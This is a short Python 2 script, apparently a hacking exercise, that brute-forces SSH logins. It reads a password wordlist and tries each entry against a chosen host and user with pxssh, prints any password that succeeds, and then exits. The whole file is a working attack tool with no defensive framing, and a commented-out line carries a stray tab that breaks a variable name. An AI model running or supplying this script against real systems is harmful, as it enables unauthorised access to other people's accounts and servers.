import pxssh
import optparse
from threading import *
import multiprocessing






Found = 0






def sshconn(host,user,password):
	global Found
	try:
		conn = pxssh.pxssh()
		conn.login(host,user,password)
		print '[+]SSH Password Found:' + password
		Found = 1

	except:
		print '[-]Testing:' + password






def main():
	parser = optparse.OptionParser('usage%prog '+'-H <target host> -U  <user> -F <password list>')
	parser.add_option('-H', dest='tgtHost', type='string', 
	help='specify target host')
	parser.add_option('-U', dest='user', type='string', 
	help='specify the user')
	parser.add_option('-F', dest='passwdFile', type='string', 
	help='specify password file')
	(options, args) = parser.parse_args()
	host = options.tgtHost
	user = options.user
	passwdFile = options.passwdFile
	if (host == None) | (user == None) | (passwdFile == None):
		print parser.usage
		exit(0)



	f = open(passwdFile,'r')
	for line in f.readlines():
		passwd = line.strip('\n')
		sshconn(host,user,passwd)
		#t = Thread(target = sshconn,args = (host,user,passwd))
		#t.start()
		#p = multiprocessing.Process(target = sshconn, args = (host,use			r,passwd))
		#p.start()
		if Found:
			exit(0)

if __name__ == '__main__':
	main()
